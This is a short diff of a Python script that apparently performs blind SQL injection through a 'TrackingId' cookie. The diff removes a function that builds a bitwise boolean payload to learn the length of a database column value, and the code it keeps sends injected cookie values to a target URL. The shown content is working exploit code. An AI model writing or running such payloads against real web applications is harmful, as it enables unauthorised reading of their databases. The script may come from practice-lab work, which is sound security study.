@@ -24,11 +24,6 @@ if (len(sys.argv) != 2):
 url = sys.argv[1]
 bits = [1,2,4,8,16,32,64,128]
 
-def checkLengthPayloadBuild(column_name, table_name, conditional_key, conditional_value):
-    payload = "' and case when ord(binary(select length(%s) from %s where %s = \'%s\'))&%d=%d then 1 else 0 end -- -" %(column_name, table_name, conditional_key, conditional_value)  
-    return payload
-
-
 def makeRequest(s, url, injection, bits_array, bit):
     s.cookies.set('TrackingId', None)
     s.cookies.set('TrackingId', injection)
